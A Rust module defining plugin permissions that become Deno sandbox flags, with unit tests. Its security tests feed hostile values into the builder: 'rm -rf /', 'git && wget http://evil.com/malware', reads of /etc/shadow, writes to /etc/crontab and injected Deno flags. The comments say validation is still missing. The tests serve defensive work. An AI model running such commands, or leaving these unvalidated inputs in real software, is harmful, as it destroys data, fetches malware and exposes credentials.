use anyhow::Result;
use std::path::Path;

/// Represents the security permissions required for plugin execution
#[derive(Debug, Clone)]
pub struct PluginPermissions {
    pub file_read: Vec<String>,
    pub file_write: Vec<String>,
    pub env_access: bool,
    pub network: Vec<String>,
    pub run_commands: Vec<String>,
}

impl PluginPermissions {
    /// Create safe conservative defaults that work for most plugins
    pub fn safe_defaults(project_root: &Path) -> Self {
        Self {
            // Allow reading project files and .makeitso directory
            file_read: vec![
                project_root.to_string_lossy().to_string(),
                ".makeitso".to_string(),
            ],
            // Allow writing to project directory only
            file_write: vec![project_root.to_string_lossy().to_string()],
            // Allow environment access (needed for many plugins)
            env_access: true,
            // No network access by default
            network: vec![],
            // No command execution by default
            run_commands: vec![],
        }
    }

    /// Convert permissions to Deno command-line arguments
    pub fn to_deno_args(&self) -> Vec<String> {
        let mut args = Vec::new();

        // File read permissions
        if !self.file_read.is_empty() {
            args.push(format!("--allow-read={}", self.file_read.join(",")));
        }

        // File write permissions
        if !self.file_write.is_empty() {
            args.push(format!("--allow-write={}", self.file_write.join(",")));
        }

        // Environment access
        if self.env_access {
            args.push("--allow-env".to_string());
        }

        // Network access (only if explicitly granted)
        if !self.network.is_empty() {
            args.push(format!("--allow-net={}", self.network.join(",")));
        }

        // Command execution (only if explicitly granted)
        if !self.run_commands.is_empty() {
            args.push(format!("--allow-run={}", self.run_commands.join(",")));
        }

        args
    }

    /// Add additional file read permissions
    pub fn allow_read<P: AsRef<Path>>(&mut self, path: P) -> &mut Self {
        self.file_read
            .push(path.as_ref().to_string_lossy().to_string());
        self
    }

    /// Add additional file write permissions
    pub fn allow_write<P: AsRef<Path>>(&mut self, path: P) -> &mut Self {
        self.file_write
            .push(path.as_ref().to_string_lossy().to_string());
        self
    }

    /// Add network permissions for specific domains
    pub fn allow_network<S: AsRef<str>>(&mut self, domain: S) -> &mut Self {
        self.network.push(domain.as_ref().to_string());
        self
    }

    /// Add permission to run specific commands
    pub fn allow_run<S: AsRef<str>>(&mut self, command: S) -> &mut Self {
        self.run_commands.push(command.as_ref().to_string());
        self
    }
}

/// Build permissions for a plugin execution
///
/// Currently returns safe defaults, but this is where we'll add:
/// - Manifest-declared permissions
/// - CLI override flags
/// - User prompts for new permissions
pub fn build_plugin_permissions(project_root: &Path) -> Result<PluginPermissions> {
    // For now, just return safe defaults
    // TODO: In future versions, this will:
    // 1. Load permissions from plugin manifest
    // 2. Apply CLI override flags
    // 3. Prompt user for additional permissions if needed
    // 4. Cache permission decisions

    Ok(PluginPermissions::safe_defaults(project_root))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_safe_defaults() {
        let project_root = PathBuf::from("/test/project");
        let permissions = PluginPermissions::safe_defaults(&project_root);

        assert_eq!(permissions.file_read, vec!["/test/project", ".makeitso"]);
        assert_eq!(permissions.file_write, vec!["/test/project"]);
        assert_eq!(permissions.env_access, true);
        assert_eq!(permissions.network, Vec::<String>::new());
        assert_eq!(permissions.run_commands, Vec::<String>::new());
    }

    #[test]
    fn test_to_deno_args_minimal() {
        let project_root = PathBuf::from("/test/project");
        let permissions = PluginPermissions::safe_defaults(&project_root);
        let args = permissions.to_deno_args();

        assert_eq!(
            args,
            vec![
                "--allow-read=/test/project,.makeitso",
                "--allow-write=/test/project",
                "--allow-env"
            ]
        );
    }

    #[test]
    fn test_to_deno_args_with_network() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);
        permissions
            .allow_network("api.github.com")
            .allow_network("registry.npmjs.org");

        let args = permissions.to_deno_args();

        assert!(args.contains(&"--allow-net=api.github.com,registry.npmjs.org".to_string()));
    }

    #[test]
    fn test_to_deno_args_with_run_commands() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);
        permissions.allow_run("git").allow_run("npm");

        let args = permissions.to_deno_args();

        assert!(args.contains(&"--allow-run=git,npm".to_string()));
    }

    #[test]
    fn test_builder_pattern() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        permissions
            .allow_read("/etc/ssl/certs")
            .allow_write("./dist")
            .allow_network("api.example.com")
            .allow_run("docker");

        let args = permissions.to_deno_args();

        assert!(args.contains(&"--allow-read=/test/project,.makeitso,/etc/ssl/certs".to_string()));
        assert!(args.contains(&"--allow-write=/test/project,./dist".to_string()));
        assert!(args.contains(&"--allow-net=api.example.com".to_string()));
        assert!(args.contains(&"--allow-run=docker".to_string()));
    }

    #[test]
    fn test_build_plugin_permissions() {
        let project_root = PathBuf::from("/test/project");
        let result = build_plugin_permissions(&project_root);

        assert!(result.is_ok());
        let permissions = result.unwrap();

        // Should return safe defaults for now
        assert_eq!(permissions.file_read, vec!["/test/project", ".makeitso"]);
        assert_eq!(permissions.env_access, true);
        assert_eq!(permissions.network, Vec::<String>::new());
    }

    // ========== SECURITY VULNERABILITY TESTS ==========
    // These tests attempt to break our security model and find vulnerabilities

    #[test]
    fn test_path_traversal_attack_prevention() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt path traversal attacks
        permissions.allow_read("../../../etc/passwd");
        permissions.allow_read("..\\..\\..\\Windows\\System32");
        permissions.allow_write("../../../tmp/malicious");

        let args = permissions.to_deno_args();

        // Note: We currently allow these through - this shows we need path validation!
        // This test documents the current (insecure) behavior
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(read_arg.contains("../../../etc/passwd"));

        // TODO: Once we add path validation, this test should be updated to verify
        // that path traversal attempts are blocked or normalized
    }

    #[test]
    fn test_absolute_system_path_injection() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt to access sensitive system files
        permissions.allow_read("/etc/passwd");
        permissions.allow_read("/etc/shadow");
        permissions.allow_read("C:\\Windows\\System32\\config\\SAM");
        permissions.allow_write("/etc/crontab");
        permissions.allow_write("/tmp/backdoor");

        let args = permissions.to_deno_args();

        // Currently these are allowed through - shows we need system path filtering
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(read_arg.contains("/etc/passwd"));

        let write_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-write="))
            .unwrap();
        assert!(write_arg.contains("/etc/crontab"));

        // TODO: Add validation to block access to system directories
    }

    #[test]
    fn test_network_wildcard_injection() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt to inject wildcards or broad network access
        permissions.allow_network("*");
        permissions.allow_network("*.*");
        permissions.allow_network("0.0.0.0");
        permissions.allow_network("::");

        let args = permissions.to_deno_args();

        // Currently these are allowed - shows we need network validation
        let net_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-net="))
            .unwrap();
        assert!(net_arg.contains("*"));
        assert!(net_arg.contains("0.0.0.0"));

        // TODO: Add validation to block wildcard network access
    }

    #[test]
    fn test_command_injection_attempt() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt command injection through run permissions
        permissions.allow_run("rm -rf /");
        permissions.allow_run("cmd /c del C:\\*");
        permissions.allow_run("sh; cat /etc/passwd");
        permissions.allow_run("git && wget http://evil.com/malware");

        let args = permissions.to_deno_args();

        // Currently these pass through - shows we need command validation
        let run_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-run="))
            .unwrap();
        assert!(run_arg.contains("rm -rf /"));
        assert!(run_arg.contains("cmd /c del"));

        // TODO: Add validation to only allow safe, single commands without arguments or chaining
    }

    #[test]
    fn test_special_characters_in_paths() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Test paths with special characters that could cause issues
        permissions.allow_read("/path with spaces/file.txt");
        permissions.allow_read("/path;with;semicolons");
        permissions.allow_read("/path\"with\"quotes");
        permissions.allow_read("/path'with'quotes");
        permissions.allow_read("/path\nwith\nnewlines");
        permissions.allow_read("/path\x00with\x00nulls");

        let args = permissions.to_deno_args();

        // Verify special characters are preserved (they could cause shell injection)
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(read_arg.contains("path with spaces"));
        assert!(read_arg.contains("path;with;semicolons"));

        // TODO: Add proper escaping or validation for special characters
    }

    #[test]
    fn test_empty_and_invalid_inputs() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Test edge cases with empty/invalid inputs
        permissions.allow_read("");
        permissions.allow_write("");
        permissions.allow_network("");
        permissions.allow_run("");

        let args = permissions.to_deno_args();

        // Debug: print the actual arguments to see what's happening
        println!("Generated args: {:?}", args);

        // Find the read arg and examine it
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        println!("Read arg: {}", read_arg);

        // Empty strings should not cause issues, but they create useless permissions
        // The actual behavior: empty strings are added to the list, creating commas with nothing between
        assert!(read_arg.contains("/test/project,.makeitso,")); // Ends with comma due to empty string

        // TODO: Filter out empty strings to avoid useless permissions
    }

    #[test]
    fn test_permission_escalation_through_symlinks() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Test potential symlink-based attacks
        permissions.allow_read("/test/project/symlink_to_etc_passwd");
        permissions.allow_write("/test/project/symlink_to_system_file");

        // These would be allowed because they're under project root,
        // but if they're symlinks to system files, they could be dangerous
        let args = permissions.to_deno_args();

        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(read_arg.contains("symlink_to_etc_passwd"));

        // TODO: Consider symlink validation or Deno's --allow-read behavior with symlinks
    }

    #[test]
    fn test_resource_exhaustion_attack() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt to create very long permission lists
        for i in 0..1000 {
            permissions.allow_read(format!("/path/to/file{}", i));
            permissions.allow_network(format!("subdomain{}.example.com", i));
        }

        let args = permissions.to_deno_args();

        // This should still work, but verify it doesn't cause memory issues
        assert!(args.len() >= 4); // At least the basic args

        // Verify one of our added permissions is there
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(read_arg.contains("file999"));

        // TODO: Consider limits on permission list size
    }

    #[test]
    fn test_deno_flag_injection() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt to inject additional Deno flags through permissions
        permissions.allow_read("--allow-all");
        permissions.allow_run("--unstable");
        permissions.allow_network("--import-map=http://evil.com/map.json");

        let args = permissions.to_deno_args();

        // These malicious "paths" are currently allowed
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(read_arg.contains("--allow-all"));

        // TODO: Validate that permission values don't look like Deno flags
    }

    #[test]
    fn test_cross_platform_path_issues() {
        // Test Windows paths on Unix-style project root and vice versa
        let unix_project = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&unix_project);

        // Add Windows-style paths
        permissions.allow_read("C:\\Windows\\System32");
        permissions.allow_write("D:\\temp\\file.txt");

        let args = permissions.to_deno_args();
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(read_arg.contains("C:\\Windows\\System32"));

        // Test the reverse - Unix paths with Windows project root
        let windows_project = PathBuf::from("C:\\test\\project");
        let mut win_permissions = PluginPermissions::safe_defaults(&windows_project);
        win_permissions.allow_read("/etc/passwd");

        let win_args = win_permissions.to_deno_args();
        let win_read_arg = win_args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(win_read_arg.contains("/etc/passwd"));

        // TODO: Add platform-specific path validation
    }

    #[test]
    fn test_no_permissions_edge_case() {
        // Test what happens when we have no permissions at all
        let permissions = PluginPermissions {
            file_read: vec![],
            file_write: vec![],
            env_access: false,
            network: vec![],
            run_commands: vec![],
        };

        let args = permissions.to_deno_args();

        // Should result in no permission flags at all
        assert!(args.is_empty());

        // This would make the plugin very restricted, but might be what we want
        // for some high-security scenarios
    }

    #[test]
    fn test_duplicate_permissions() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Add duplicate permissions
        permissions.allow_read("/test/project"); // Already in defaults
        permissions.allow_network("api.github.com");
        permissions.allow_network("api.github.com"); // Duplicate

        let args = permissions.to_deno_args();

        // Currently allows duplicates - inefficient but not dangerous
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert_eq!(read_arg.matches("/test/project").count(), 2); // Appears twice

        let net_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-net="))
            .unwrap();
        assert_eq!(net_arg.matches("api.github.com").count(), 2); // Appears twice

        // TODO: Deduplicate permissions for efficiency
    }
}
